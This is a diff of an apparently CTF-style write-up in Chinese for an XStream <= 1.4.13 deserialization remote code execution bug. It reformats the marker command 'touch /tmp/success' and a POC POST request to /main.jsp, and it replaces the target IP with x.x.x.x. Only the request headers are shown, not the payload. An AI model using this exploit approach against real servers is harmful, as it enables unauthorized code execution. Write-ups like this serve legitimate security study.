@@ -6,20 +6,25 @@ Xstream <= 1.4.13 反序列化RCE， 无回显
 
 ## writeup
 
-待执行命令 touch /tmp/success
+- 待执行命令 
 
-POC
+```
+touch /tmp/success
+```
+
+- POC
+
 ```
 POST /main.jsp HTTP/1.1
-Host: 106.53.141.62:1234
+Host: x.x.x.x:1234
 Content-Length: 2047
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://106.53.141.62:1234
+Origin: http://x.x.x.x:1234
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://106.53.141.62:1234/test.html
+Referer: http://x.x.x.x:1234/test.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 Connection: close
